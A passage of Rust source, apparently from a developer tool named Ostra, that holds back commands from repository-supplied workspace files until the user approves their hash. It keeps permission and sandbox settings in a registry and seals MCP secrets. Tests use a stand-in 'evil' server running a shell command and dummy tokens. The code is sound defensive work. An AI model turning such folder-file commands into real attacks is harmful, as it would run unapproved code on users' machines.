//! Commands from folder files. `.ostra/workspace.toml` and `.ostra/project.toml` can arrive with a
//! repository, a `git pull`, or an agent's edit, so the programs they name start only after the
//! user approved exactly that content. Ostra's own saves keep an approval current, so edits made
//! in the UI never ask again. The permission mode and YOLO live in the registry and are never read
//! from a folder file.

use ostra_core::api::{PendingCommand, PendingCommands, PendingKind};
use ostra_core::config::{
    CodeProviderConfig, ConfigError, LanguageServerConfig, McpOAuthConfig, McpServerConfig,
    PermissionMode, ProjectProfile, WorkspaceSettings, load_toml, load_toml_required, save_toml,
};
use ostra_core::{mcp, paths};
use ostra_store::RegistryDb;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// Shown where a program was not started because its settings wait for approval.
pub const PENDING_MESSAGE: &str =
    "Approve the changed commands in settings, because they changed outside Ostra.";

/// Paths reach here canonical from some callers and as written in settings from others.
fn canon(p: &Path) -> String {
    ostra_core::paths::canonical(p)
        .unwrap_or_else(|_| p.to_path_buf())
        .display()
        .to_string()
}

fn workspace_key(root: &Path) -> String {
    format!("trust:workspace:{}", canon(root))
}

fn format_key(project: &Path) -> String {
    format!("trust:format:{}", canon(project))
}

fn migrated_key(root: &Path) -> String {
    format!("trust:migrated:{}", canon(root))
}

fn paths_migrated_key(root: &Path) -> String {
    format!("trust:migrated-paths:{}", canon(root))
}

fn access_key(root: &Path) -> String {
    format!("workspace_access:{}", canon(root))
}

fn sha(text: &str) -> String {
    hex::encode(Sha256::digest(text.as_bytes()))
}

#[derive(Serialize)]
struct McpCanon<'a> {
    name: &'a str,
    enabled: bool,
    command: &'a [String],
    env: &'a BTreeMap<String, String>,
    url: &'a Option<String>,
    headers: &'a BTreeMap<String, String>,
    oauth: &'a Option<McpOAuthConfig>,
}

#[derive(Serialize)]
struct ProjectCanon<'a> {
    key: &'a str,
    path: &'a Path,
    code_provider: &'a Option<CodeProviderConfig>,
    language_servers: &'a [LanguageServerConfig],
}

#[derive(Serialize)]
struct OutsideCanon<'a> {
    key: &'a str,
    path: &'a Path,
}

#[derive(Serialize)]
struct WorkspaceCanon<'a> {
    mcp_servers: Vec<McpCanon<'a>>,
    projects: Vec<ProjectCanon<'a>>,
    allow: &'a [String],
    /// Left out when empty, so files without such projects keep the hash they had before.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    outside: Vec<OutsideCanon<'a>>,
    /// Rule PL1: plugin programs. Left out when empty, like `outside`.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    plugins: Vec<&'a ostra_core::plugin::PluginConfig>,
    /// Rules CA1 and WF1: each custom agent and workflow file and the hash of its content,
    /// because they decide which agents run and what they are told.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    definitions: Vec<(String, String)>,
}

/// The custom agent and workflow files of the workspace at `root`, by path under `.ostra/`, with
/// the hash of each file's content.
pub fn definition_files(root: &Path) -> Vec<(String, String)> {
    let mut out = vec![];
    for (dir, ext) in [
        (paths::workspace_agents_dir(root), "md"),
        (paths::workspace_workflows_dir(root), "toml"),
        (paths::workspace_transforms_dir(root), "toml"),
    ] {
        let folder = dir
            .file_name()
            .map(|f| f.to_string_lossy().to_string())
            .unwrap_or_default();
        let mut files: Vec<PathBuf> = std::fs::read_dir(&dir)
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path())
            .filter(|p| p.extension().is_some_and(|e| e == ext) && p.is_file())
            .collect();
        files.sort();
        for f in files {
            let name = f
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();
            let content = std::fs::read(&f).unwrap_or_default();
            out.push((
                format!("{folder}/{name}"),
                hex::encode(Sha256::digest(&content)),
            ));
        }
    }
    out
}

/// A project folder outside the workspace folder. Agents may write in their project, so a
/// folder file that points one at `$HOME` would widen what they can change.
fn outside(root: &Path, project: &Path) -> bool {
    !paths::is_inside(&paths::resolve(root, root), &paths::resolve(root, project))
}

/// The hash of everything in the workspace file that starts a program or loosens a check.
/// `None` when there is nothing of that kind, which needs no approval.
pub fn workspace_hash(root: &Path, s: &WorkspaceSettings) -> Option<String> {
    hash_of(Some(root), s)
}

/// `root` is `None` for the hash approvals had before project paths counted.
fn hash_of(root: Option<&Path>, s: &WorkspaceSettings) -> Option<String> {
    let canon = WorkspaceCanon {
        mcp_servers: s
            .mcp_servers
            .iter()
            .map(|m| McpCanon {
                name: &m.name,
                enabled: m.enabled,
                command: &m.command,
                env: &m.env,
                url: &m.url,
                headers: &m.headers,
                oauth: &m.oauth,
            })
            .collect(),
        projects: s
            .projects
            .iter()
            .filter(|p| p.code_provider.is_some() || !p.language_servers.is_empty())
            .map(|p| ProjectCanon {
                key: &p.key,
                path: &p.path,
                code_provider: &p.code_provider,
                language_servers: &p.language_servers,
            })
            .collect(),
        allow: &s.permissions.allow,
        outside: s
            .projects
            .iter()
            .filter(|p| root.is_some_and(|r| outside(r, &p.path)))
            .map(|p| OutsideCanon {
                key: &p.key,
                path: &p.path,
            })
            .collect(),
        plugins: s.plugins.iter().collect(),
        definitions: root.map(definition_files).unwrap_or_default(),
    };
    if canon.mcp_servers.is_empty()
        && canon.projects.is_empty()
        && canon.allow.is_empty()
        && canon.outside.is_empty()
        && canon.plugins.is_empty()
        && canon.definitions.is_empty()
    {
        return None;
    }
    Some(sha(&serde_json::to_string(&canon).unwrap_or_default()))
}

/// The hash of a project's format command, the one project command Ostra runs itself.
pub fn format_hash(command: Option<&str>) -> Option<String> {
    command
        .map(str::trim)
        .filter(|c| !c.is_empty())
        .map(|c| sha(&format!("format\0{c}")))
}

fn approved(registry: &RegistryDb, key: &str, hash: Option<String>) -> bool {
    let Some(hash) = hash else { return true };
    registry
        .kv_get(key)
        .ok()
        .flatten()
        .is_some_and(|v| v == hash.as_bytes())
}

fn record(registry: &RegistryDb, key: &str, hash: Option<String>) {
    let r = match hash {
        Some(h) => registry.kv_set(key, h.as_bytes()),
        None => registry.kv_delete(key).map(|_| ()),
    };
    if let Err(e) = r {
        tracing::warn!("could not record a command approval: {e}");
    }
}

fn raw(root: &Path) -> Option<WorkspaceSettings> {
    load_toml_required(&paths::workspace_toml(root)).ok()
}

fn profile(project: &Path) -> ProjectProfile {
    load_toml(&paths::project_profile(project)).unwrap_or_default()
}

// Rule A1: a folder file's programs start only while its command-bearing content is approved.
pub fn workspace_approved(registry: &RegistryDb, root: &Path, s: &WorkspaceSettings) -> bool {
    approved(registry, &workspace_key(root), workspace_hash(root, s))
}

/// The workspace file on disk, when its content is approved. An unreadable file is not. Start
/// programs from this copy, because a second read could see a file changed after the check.
pub fn approved_workspace_file(registry: &RegistryDb, root: &Path) -> Option<WorkspaceSettings> {
    raw(root).filter(|s| workspace_approved(registry, root, s))
}

pub fn workspace_file_approved(registry: &RegistryDb, root: &Path) -> bool {
    approved_workspace_file(registry, root).is_some()
}

pub fn format_approved(registry: &RegistryDb, project: &Path, command: &str) -> bool {
    approved(registry, &format_key(project), format_hash(Some(command)))
}

// ---------------------------------------------------------------------------------------------
// MCP header and env values
// ---------------------------------------------------------------------------------------------

/// Length-prefixed, so one workspace path can never be a prefix of another's keys.
fn mcp_secret_prefix(root: &Path) -> String {
    let root = canon(root);
    format!("mcp_secret:{}:{root}|", root.len())
}

/// A saved value belongs to the server's name and to where it connects, so pointing the server
/// at another URL or command never sends it the old value.
fn mcp_secret_key(root: &Path, server: &McpServerConfig, field: &str) -> String {
    let target = sha(&serde_json::json!([server.url, server.command]).to_string());
    format!(
        "{}{}|{}|{field}",
        mcp_secret_prefix(root),
        server.name,
        &target[..16]
    )
}

/// A header or env value saved with [`seal_mcp_values`], for the connection only.
pub fn mcp_secret(
    registry: &RegistryDb,
    root: &Path,
    server: &McpServerConfig,
    field: &str,
) -> Option<String> {
    let v = registry
        .secret_get(&mcp_secret_key(root, server, field))
        .ok()??;
    String::from_utf8(v).ok()
}

/// Move literal MCP header and env values into the encrypted registry, leaving
/// [`mcp::SAVED_SECRET`] in the settings, and drop saved values nothing names any more. True when
/// a value moved.
fn seal_mcp_values(registry: &RegistryDb, root: &Path, s: &mut WorkspaceSettings) -> bool {
    let mut moved = false;
    let mut kept = std::collections::BTreeSet::new();
    for m in &mut s.mcp_servers {
        let server = m.clone();
        let fields = m
            .headers
            .iter_mut()
            .map(|(k, v)| (format!("headers.{k}"), v))
            .chain(m.env.iter_mut().map(|(k, v)| (format!("env.{k}"), v)));
        for (field, value) in fields {
            let key = mcp_secret_key(root, &server, &field);
            if mcp::is_literal_value(value) {
                match registry.secret_set(&key, value.as_bytes()) {
                    Ok(()) => {
                        *value = mcp::SAVED_SECRET.to_string();
                        moved = true;
                    }
                    Err(e) => tracing::warn!("could not save the MCP value {field}: {e}"),
                }
            }
            if value == mcp::SAVED_SECRET {
                kept.insert(key);
            }
        }
    }
    for (key, _) in registry
        .kv_scan(&mcp_secret_prefix(root))
        .unwrap_or_default()
    {
        if !kept.contains(&key) {
            let _ = registry.kv_delete(&key);
        }
    }
    moved
}

/// Store the literal MCP values the file on disk holds, so a save from the browser, which only
/// ever saw the marker for them, keeps them.
fn stash_file_literals(registry: &RegistryDb, root: &Path) {
    let Some(on_disk) = raw(root) else { return };
    for m in &on_disk.mcp_servers {
        let fields = m
            .headers
            .iter()
            .map(|(k, v)| (format!("headers.{k}"), v))
            .chain(m.env.iter().map(|(k, v)| (format!("env.{k}"), v)));
        for (field, value) in fields {
            if mcp::is_literal_value(value)
                && let Err(e) =
                    registry.secret_set(&mcp_secret_key(root, m, &field), value.as_bytes())
            {
                tracing::warn!("could not save the MCP value {field}: {e}");
            }
        }
    }
}

/// Seal literal MCP values a folder file still holds, such as one written before values moved
/// to the registry or committed with the repository.
pub fn seal_file_secrets(registry: &RegistryDb, root: &Path) {
    let Some(mut s) = raw(root) else { return };
    if !s
        .mcp_servers
        .iter()
        .flat_map(|m| m.headers.values().chain(m.env.values()))
        .any(|v| mcp::is_literal_value(v))
    {
        return;
    }
    overlay(registry, root, &mut s);
    tracing::info!(
        "workspace {}: moving MCP header and env values from workspace.toml into Ostra's encrypted store",
        root.display()
    );
    if let Err(e) = save_workspace(registry, root, &s) {
        tracing::warn!("could not move MCP values out of workspace.toml: {e}");
    }
}

// ---------------------------------------------------------------------------------------------
// Permission mode and YOLO
// ---------------------------------------------------------------------------------------------

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct Access {
    mode: PermissionMode,
    yolo: bool,
    /// Absent in records saved before limits moved here; those use the defaults.
    #[serde(default)]
    limits: Option<ostra_core::config::Limits>,
    #[serde(default)]
    sandbox_mode: Option<ostra_core::config::SandboxMode>,
    #[serde(default)]
    tool_enforcement: Option<ostra_core::config::ToolEnforcement>,
    #[serde(default)]
    sandbox_network: Option<ostra_core::config::SandboxNetwork>,
    #[serde(default)]
    sandbox_allowed_hosts: Vec<String>,
    #[serde(default)]
    sandbox_decoys: Vec<String>,
    #[serde(default)]
    sandbox_readable: Vec<String>,
    #[serde(default)]
    sandbox_loopback: ostra_core::config::LoopbackAccess,
    #[serde(default)]
    sandbox_blocked_ports: Vec<u16>,
}

fn access(registry: &RegistryDb, root: &Path) -> Access {
    registry
        .kv_get(&access_key(root))
        .ok()
        .flatten()
        .and_then(|v| serde_json::from_slice(&v).ok())
        .unwrap_or_default()
}

fn set_access(registry: &RegistryDb, root: &Path, s: &WorkspaceSettings) {
    let body = serde_json::to_vec(&Access {
        mode: s.permissions.mode,
        yolo: s.yolo.default,
        limits: Some(s.limits.clone()),
        sandbox_mode: s.sandbox_mode,
        tool_enforcement: s.tool_enforcement,
        sandbox_network: s.sandbox_network,
        sandbox_allowed_hosts: s.sandbox_allowed_hosts.clone(),
        sandbox_decoys: s.sandbox_decoys.clone(),
        sandbox_readable: s.sandbox_readable.clone(),
        sandbox_loopback: s.sandbox_loopback,
        sandbox_blocked_ports: s.sandbox_blocked_ports.clone(),
    })
    .unwrap_or_default();
    if let Err(e) = registry.kv_set(&access_key(root), &body) {
        tracing::warn!("could not save the permission mode: {e}");
    }
}

// Rule A2: the permission mode, YOLO, spend limits, tool enforcement, and the sandbox mode,
// network, hosts, decoys, readable credentials, and loopback choice come from the registry, never from a folder file,
// because a repository could otherwise lift its own budget, turn off its own guards, open its own
// sandbox, read the user's credentials, or plant decoys that pause every session.
pub fn overlay(registry: &RegistryDb, root: &Path, s: &mut WorkspaceSettings) {
    let a = access(registry, root);
    s.permissions.mode = a.mode;
    s.yolo.default = a.yolo;
    s.limits = a.limits.unwrap_or_default();
    s.sandbox_mode = a.sandbox_mode;
    s.tool_enforcement = a.tool_enforcement;
    s.sandbox_network = a.sandbox_network;
    s.sandbox_allowed_hosts = a.sandbox_allowed_hosts;
    s.sandbox_decoys = a.sandbox_decoys;
    s.sandbox_readable = a.sandbox_readable;
    s.sandbox_loopback = a.sandbox_loopback;
    s.sandbox_blocked_ports = a.sandbox_blocked_ports;
}

/// The workspace's own sandbox settings, from the registry (Rule A2).
pub fn sandbox(registry: &RegistryDb, root: &Path) -> ostra_core::config::WorkspaceSandbox {
    let a = access(registry, root);
    ostra_core::config::WorkspaceSandbox {
        mode: a.sandbox_mode,
        network: a.sandbox_network,
        allowed_hosts: a.sandbox_allowed_hosts,
        readable: a.sandbox_readable,
        loopback: a.sandbox_loopback,
        blocked_ports: a.sandbox_blocked_ports,
    }
}

/// The settings programs run with: [`overlay`], and while the file waits for approval, no MCP
/// server, language server, code provider, or allow rule from it.
pub fn effective(
    registry: &RegistryDb,
    root: &Path,
    mut s: WorkspaceSettings,
) -> WorkspaceSettings {
    overlay(registry, root, &mut s);
    if !workspace_approved(registry, root, &s) {
        for m in &mut s.mcp_servers {
            m.enabled = false;
        }
        for p in &mut s.projects {
            p.code_provider = None;
            p.language_servers.clear();
        }
        s.permissions.allow.clear();
        s.projects.retain(|p| !outside(root, &p.path));
        for p in &mut s.plugins {
            p.enabled = false;
        }
    }
    s
}

/// Rules CA1, WF1, and PL1: the workspace's custom agents, workflows, and plugins run only while
/// its folder file, which covers them, is approved.
pub fn definitions_approved(registry: &RegistryDb, root: &Path) -> bool {
    workspace_file_approved(registry, root)
}

/// Rule A1: write, or delete when `content` is `None`, one agent or workflow file for a save made
/// in Ostra. Those files are part of the hash the user approves, so an approved workspace stays
/// approved with the new content, and one that waits keeps waiting.
pub fn save_definition(
    registry: &RegistryDb,
    root: &Path,
    path: &Path,
    content: Option<&str>,
) -> std::io::Result<()> {
    save_definitions(
        registry,
        root,
        &[(path.to_path_buf(), content.map(String::from))],
    )
}

/// [`save_definition`] for several files at once.
pub fn save_definitions(
    registry: &RegistryDb,
    root: &Path,
    files: &[(PathBuf, Option<String>)],
) -> std::io::Result<()> {
    let was_approved = raw(root).is_none_or(|s| workspace_approved(registry, root, &s));
    for (path, content) in files {
        match content {
            Some(text) => {
                if let Some(dir) = path.parent() {
                    std::fs::create_dir_all(dir)?;
                }
                std::fs::write(path, text)?;
            }
            None => match std::fs::remove_file(path) {
                Err(e) if e.kind() != std::io::ErrorKind::NotFound => return Err(e),
                _ => {}
            },
        }
    }
    if was_approved && let Some(s) = raw(root) {
        record(registry, &workspace_key(root), workspace_hash(root, &s));
    }
    Ok(())
}

/// Rule WF9: the shipped default workflow files `names` that `root` has no copy of, as a save
/// writes them.
pub fn default_workflow_files(root: &Path, names: &[String]) -> Vec<(PathBuf, Option<String>)> {
    let dir = paths::workspace_workflows_dir(root);
    names
        .iter()
        .filter_map(|n| {
            let path = dir.join(format!("{n}.toml"));
            let text = ostra_core::workflow::default_text(n)?;
            (!path.exists()).then(|| (path, Some(text.to_string())))
        })
        .collect()
}

/// Write the workspace file for a save made in Ostra. The mode and YOLO go to the registry and
/// stay out of the file. An approved file stays approved with its new content; a file waiting for
/// approval keeps waiting, so a save cannot approve commands the user was not shown.
pub fn save_workspace(
    registry: &RegistryDb,
    root: &Path,
    s: &WorkspaceSettings,
) -> Result<(), ConfigError> {
    let was_approved =
        !paths::workspace_toml(root).exists() || workspace_file_approved(registry, root);
    stash_file_literals(registry, root);
    let mut s = s.clone();
    seal_mcp_values(registry, root, &mut s);
    let s = &s;
    write_file(root, s)?;
    set_access(registry, root, s);
    if was_approved {
        record(registry, &workspace_key(root), workspace_hash(root, s));
    }
    Ok(())
}

fn write_file(root: &Path, s: &WorkspaceSettings) -> Result<(), ConfigError> {
    let path = paths::workspace_toml(root);
    let mut value = toml::Value::try_from(s).map_err(|e| ConfigError::Parse {
        path: path.clone(),
        message: e.to_string(),
    })?;
    if let Some(t) = value.as_table_mut() {
        t.remove("yolo");
        t.remove("limits");
        t.remove("sandbox_mode");
        t.remove("tool_enforcement");
        t.remove("sandbox_network");
        t.remove("sandbox_allowed_hosts");
        t.remove("sandbox_decoys");
        t.remove("sandbox_readable");
        t.remove("sandbox_loopback");
        t.remove("sandbox_blocked_ports");
        if let Some(p) = t.get_mut("permissions").and_then(|p| p.as_table_mut()) {
            p.remove("mode");
        }
    }
    save_toml(&path, &value)
}

/// A new workspace. `adopted` is true when its file was already in the folder: then nothing in
/// it is approved and its mode and YOLO are ignored, while the request's own choices apply.
pub fn create_workspace(
    registry: &RegistryDb,
    root: &Path,
    s: &WorkspaceSettings,
    adopted: bool,
) -> Result<(), ConfigError> {
    if adopted {
        tracing::info!(
            "workspace {}: the folder's workspace.toml runs no program until its commands are approved",
            root.display()
        );
    }
    let mut s = s.clone();
    seal_mcp_values(registry, root, &mut s);
    let s = &s;
    write_file(root, s)?;
    set_access(registry, root, s);
    // Rule WF9: a new workspace starts with copies of Ostra's default workflows. A folder that
    // brings its own files gets none, and Settings offers the missing ones.
    if !adopted {
        let all: Vec<String> = ostra_core::workflow::BUILTIN_BASES
            .iter()
            .map(|c| ostra_core::workflow::category_name(*c))
            .collect();
        for (path, text) in default_workflow_files(root, &all) {
            if let Some(dir) = path.parent() {
                std::fs::create_dir_all(dir).map_err(|e| ConfigError::Io {
                    path: dir.to_path_buf(),
                    source: e,
                })?;
            }
            std::fs::write(&path, text.unwrap_or_default())
                .map_err(|e| ConfigError::Io { path, source: e })?;
        }
    }
    if adopted {
        record(registry, &workspace_key(root), None);
    } else {
        record(registry, &workspace_key(root), workspace_hash(root, s));
    }
    mark_migrated(registry, root);
    Ok(())
}

fn mark_migrated(registry: &RegistryDb, root: &Path) {
    for key in [migrated_key(root), paths_migrated_key(root)] {
        if let Err(e) = registry.kv_set(&key, b"1") {
            tracing::warn!("could not record the command approvals: {e}");
        }
    }
}

/// Approvals recorded before project paths counted stay approved once: when the stored hash is
/// the old hash of the current file, it becomes the new one. Later changes need approval.
fn migrate_paths(registry: &RegistryDb, root: &Path) {
    let key = paths_migrated_key(root);
    if registry.kv_get(&key).ok().flatten().is_some() {
        return;
    }
    if let Some(s) = raw(root)
        && hash_of(None, &s).is_some_and(|old| approved(registry, &workspace_key(root), Some(old)))
    {
        record(registry, &workspace_key(root), workspace_hash(root, &s));
    }
    let _ = registry.kv_set(&key, b"1");
}

/// Workspaces registered before approvals existed keep what they ran: their current files are
/// approved once, and the mode and YOLO move from the file to the registry.
pub fn migrate(registry: &RegistryDb, root: &Path) {
    migrate_paths(registry, root);
    if registry
        .kv_get(&migrated_key(root))
        .ok()
        .flatten()
        .is_some()
    {
        return;
    }
    let Some(s) = raw(root) else { return };
    tracing::info!(
        "workspace {}: approving the commands it already had, because it was registered before command approval",
        root.display()
    );
    set_access(registry, root, &s);
    record(registry, &workspace_key(root), workspace_hash(root, &s));
    for p in &s.projects {
        let f = profile(&p.path).commands.format;
        record(registry, &format_key(&p.path), format_hash(f.as_deref()));
    }
    mark_migrated(registry, root);
}

/// A deleted workspace's approvals go with it, so registering the folder again starts fresh.
pub fn forget(registry: &RegistryDb, root: &Path) {
    for key in [
        workspace_key(root),
        migrated_key(root),
        paths_migrated_key(root),
        access_key(root),
    ] {
        let _ = registry.kv_delete(&key);
    }
    let oauth = format!("mcp_oauth:{}:", root.display());
    for prefix in [mcp_secret_prefix(root), oauth] {
        for (key, _) in registry.kv_scan(&prefix).unwrap_or_default() {
            let _ = registry.kv_delete(&key);
        }
    }
}

/// Record a save of a project's commands made in Ostra, with the same rule as
/// [`save_workspace`]. Call it with the format command before and after the save.
pub fn saved_format(
    registry: &RegistryDb,
    project: &Path,
    before: Option<&str>,
    after: Option<&str>,
) {
    let was_approved = approved(registry, &format_key(project), format_hash(before));
    if was_approved {
        record(registry, &format_key(project), format_hash(after));
    }
}

// ---------------------------------------------------------------------------------------------
// What waits for approval
// ---------------------------------------------------------------------------------------------

fn quote(argv: &[String]) -> String {
    argv.iter()
        .map(|a| {
            if !a.is_empty()
                && a.chars()
                    .all(|c| c.is_ascii_alphanumeric() || "-_./=:,@%+".contains(c))
            {
                a.clone()
            } else {
                format!("'{}'", a.replace('\'', r"'\''"))
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

fn variables<'a>(values: impl Iterator<Item = &'a String>) -> Vec<String> {
    let names = std::cell::RefCell::new(Vec::<String>::new());
    for v in values {
        let _ = ostra_core::mcp::expand_with(v, |k| {
            names.borrow_mut().push(k.to_string());
            Some(String::new())
        });
    }
    let mut out = names.into_inner();
    out.sort();
    out.dedup();
    out
}

fn item(kind: PendingKind, name: &str) -> PendingCommand {
    PendingCommand {
        kind,
        name: name.to_string(),
        enabled: true,
        command: None,
        url: None,
        env: vec![],
        headers: vec![],
        variables: vec![],
        path: None,
    }
}

fn workspace_items(root: &Path, s: &WorkspaceSettings) -> Vec<PendingCommand> {
    let mut out = vec![];
    for p in s.projects.iter().filter(|p| outside(root, &p.path)) {
        out.push(PendingCommand {
            path: Some(p.path.clone()),
            ..item(PendingKind::ProjectOutside, &p.key)
        });
    }
    for m in &s.mcp_servers {
        let mut vars = variables(m.env.values().chain(m.headers.values()));
        if let Some(v) = m.oauth.as_ref().and_then(|o| o.client_secret_env.clone()) {
            vars.push(v);
        }
        out.push(PendingCommand {
            enabled: m.enabled,
            command: (!m.command.is_empty()).then(|| quote(&m.command)),
            url: m.url.clone(),
            env: m.env.keys().cloned().collect(),
            headers: m.headers.keys().cloned().collect(),
            variables: vars,
            ..item(PendingKind::McpServer, &m.name)
        });
    }
    for p in &s.projects {
        if let Some(cp) = &p.code_provider {
            out.push(PendingCommand {
                command: Some(quote(&cp.command)),
                ..item(PendingKind::CodeProvider, &p.key)
            });
        }
        for l in &p.language_servers {
            out.push(PendingCommand {
                command: Some(quote(&l.command)),
                ..item(PendingKind::LanguageServer, &p.key)
            });
        }
    }
    for rule in &s.permissions.allow {
        out.push(item(PendingKind::AllowRule, rule));
    }
    for p in &s.plugins {
        out.push(PendingCommand {
            enabled: p.enabled,
            command: Some(quote(&p.command)),
            env: p.env.keys().cloned().collect(),
            ..item(PendingKind::Plugin, &p.name)
        });
    }
    for (file, _) in definition_files(root) {
        let kind = if file.starts_with("agents/") {
            PendingKind::AgentFile
        } else if file.starts_with("transforms/") {
            PendingKind::TransformFile
        } else {
            PendingKind::WorkflowFile
        };
        out.push(PendingCommand {
            path: Some(paths::workspace_runtime(root).join(&file)),
            ..item(kind, &file)
        });
    }
    out
}

/// Every folder file of the workspace whose commands wait for approval.
pub fn pending(registry: &RegistryDb, root: &Path, s: &WorkspaceSettings) -> Vec<PendingCommands> {
    let mut out = vec![];
    if let Some(hash) = workspace_hash(root, s)
        && !workspace_approved(registry, root, s)
    {
        out.push(PendingCommands {
            project: None,
            file: paths::workspace_toml(root),
            hash,
            items: workspace_items(root, s),
        });
    }
    for p in &s.projects {
        let format = profile(&p.path).commands.format;
        if let Some(hash) = format_hash(format.as_deref())
            && !approved(registry, &format_key(&p.path), Some(hash.clone()))
        {
            out.push(PendingCommands {
                project: Some(p.key.clone()),
                file: paths::project_profile(&p.path),
                hash,
                items: vec![PendingCommand {
                    command: format.map(|c| c.trim().to_string()),
                    ..item(PendingKind::FormatCommand, &p.key)
                }],
            });
        }
    }
    out
}

pub enum ApproveError {
    NoProject(String),
    Changed,
}

/// Approve the file the browser showed. Refused when its content changed since.
pub fn approve(
    registry: &RegistryDb,
    root: &Path,
    s: &WorkspaceSettings,
    project: Option<&str>,
    hash: &str,
) -> Result<(), ApproveError> {
    let (key, current) = match project {
        None => (workspace_key(root), workspace_hash(root, s)),
        Some(k) => {
            let p: PathBuf = s
                .project(k)
                .map(|p| p.path.clone())
                .ok_or_else(|| ApproveError::NoProject(k.to_string()))?;
            let f = profile(&p).commands.format;
            (format_key(&p), format_hash(f.as_deref()))
        }
    };
    if current.as_deref() != Some(hash) {
        return Err(ApproveError::Changed);
    }
    record(registry, &key, current);
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use ostra_core::config::{ProjectEntry, SandboxMode};

    fn registry() -> (tempfile::TempDir, RegistryDb) {
        let dir = tempfile::tempdir().unwrap();
        let db = RegistryDb::open(&dir.path().join("r.db")).unwrap();
        (dir, db)
    }

    fn with_server() -> WorkspaceSettings {
        let mut s = WorkspaceSettings::seeded("w");
        s.mcp_servers.push(McpServerConfig::local(
            "evil",
            &["sh", "-c", "touch /tmp/x"],
        ));
        s
    }

    #[test]
    fn literal_mcp_values_move_to_the_registry() {
        let r = RegistryDb::open_in_memory().unwrap();
        let d = tempfile::tempdir().unwrap();
        let root = d.path().join("ws");
        std::fs::create_dir_all(paths::workspace_runtime(&root)).unwrap();
        let mut s = WorkspaceSettings::seeded("w");
        let mut m = McpServerConfig::local("gh", &["gh-mcp"]);
        m.env.insert("TOKEN".into(), "ghp_literal".into());
        m.env.insert("FROM_ENV".into(), "${GH_TOKEN}".into());
        s.mcp_servers.push(m);
        save_workspace(&r, &root, &s).unwrap();

        let text = std::fs::read_to_string(paths::workspace_toml(&root)).unwrap();
        assert!(!text.contains("ghp_literal"), "{text}");
        assert!(text.contains("${GH_TOKEN}"));
        let saved = raw(&root).unwrap();
        assert_eq!(saved.mcp_servers[0].env["TOKEN"], mcp::SAVED_SECRET);
        assert_eq!(
            mcp_secret(&r, &root, &raw(&root).unwrap().mcp_servers[0], "env.TOKEN").as_deref(),
            Some("ghp_literal")
        );

        // Saving the marker back keeps the value; removing the variable forgets it.
        save_workspace(&r, &root, &saved).unwrap();
        assert!(mcp_secret(&r, &root, &raw(&root).unwrap().mcp_servers[0], "env.TOKEN").is_some());
        let mut gone = saved.clone();
        gone.mcp_servers[0].env.remove("TOKEN");
        save_workspace(&r, &root, &gone).unwrap();
        assert!(mcp_secret(&r, &root, &raw(&root).unwrap().mcp_servers[0], "env.TOKEN").is_none());
    }

    #[test]
    fn a_folder_file_with_literal_values_is_sealed_on_load() {
        let r = RegistryDb::open_in_memory().unwrap();
        let d = tempfile::tempdir().unwrap();
        let root = d.path().join("ws");
        std::fs::create_dir_all(paths::workspace_runtime(&root)).unwrap();
        let mut s = WorkspaceSettings::seeded("w");
        let mut m = McpServerConfig::remote("api", "https://mcp.example.test/");
        m.headers
            .insert("Authorization".into(), "Bearer abc123".into());
        s.mcp_servers.push(m);
        save_toml(&paths::workspace_toml(&root), &s).unwrap();
        seal_file_secrets(&r, &root);
        let text = std::fs::read_to_string(paths::workspace_toml(&root)).unwrap();
        assert!(!text.contains("abc123"), "{text}");
        assert_eq!(
            mcp_secret(
                &r,
                &root,
                &raw(&root).unwrap().mcp_servers[0],
                "headers.Authorization"
            )
            .as_deref(),
            Some("Bearer abc123")
        );
        assert!(
            !workspace_file_approved(&r, &root),
            "sealing approves nothing"
        );
        let mut moved = raw(&root).unwrap().mcp_servers[0].clone();
        moved.url = Some("https://other.example.test/".into());
        assert!(
            mcp_secret(&r, &root, &moved, "headers.Authorization").is_none(),
            "a value never follows the server to a new URL"
        );

        // A literal pulled into the file after that, saved back from the browser as the marker.
        let mut pulled = raw(&root).unwrap();
        pulled.mcp_servers[0]
            .headers
            .insert("X-Key".into(), "pulled-value".into());
        save_toml(&paths::workspace_toml(&root), &pulled).unwrap();
        let mut from_browser = pulled.clone();
        from_browser.mcp_servers[0]
            .headers
            .insert("X-Key".into(), mcp::SAVED_SECRET.into());
        save_workspace(&r, &root, &from_browser).unwrap();
        assert_eq!(
            mcp_secret(
                &r,
                &root,
                &raw(&root).unwrap().mcp_servers[0],
                "headers.X-Key"
            )
            .as_deref(),
            Some("pulled-value")
        );
    }

    #[test]
    fn a_project_outside_the_workspace_waits_for_approval() {
        let (d, r) = registry();
        let root = d.path().join("ws");
        std::fs::create_dir_all(paths::workspace_runtime(&root)).unwrap();
        std::fs::create_dir_all(root.join("inside")).unwrap();
        let mut s = WorkspaceSettings::seeded("w");
        s.projects.push(ProjectEntry {
            key: "inside".into(),
            path: root.join("inside"),
            stack: None,
            code_provider: None,
            language_servers: vec![],
        });
        assert_eq!(
            workspace_hash(&root, &s),
            None,
            "a project inside needs nothing"
        );
        save_workspace(&r, &root, &s).unwrap();

        // A pull that adds a project at the user's home folder.
        let mut pulled = s.clone();
        pulled.projects.push(ProjectEntry {
            key: "home".into(),
            path: d.path().to_path_buf(),
            stack: None,
            code_provider: None,
            language_servers: vec![],
        });
        save_toml(&paths::workspace_toml(&root), &pulled).unwrap();
        let file = raw(&root).unwrap();
        assert!(!workspace_approved(&r, &root, &file));
        let eff = effective(&r, &root, file.clone());
        assert!(
            eff.projects.iter().all(|p| p.key != "home"),
            "dropped until approved"
        );
        let items = &pending(&r, &root, &file)[0].items;
        assert!(
            items
                .iter()
                .any(|i| i.kind == PendingKind::ProjectOutside && i.name == "home")
        );

        let hash = workspace_hash(&root, &file).unwrap();
        assert!(approve(&r, &root, &file, None, &hash).is_ok());
        assert!(
            effective(&r, &root, file)
                .projects
                .iter()
                .any(|p| p.key == "home")
        );
    }

    #[test]
    fn nothing_command_bearing_needs_no_approval() {
        let (_d, r) = registry();
        let s = WorkspaceSettings::seeded("w");
        assert_eq!(workspace_hash(Path::new("/ws"), &s), None);
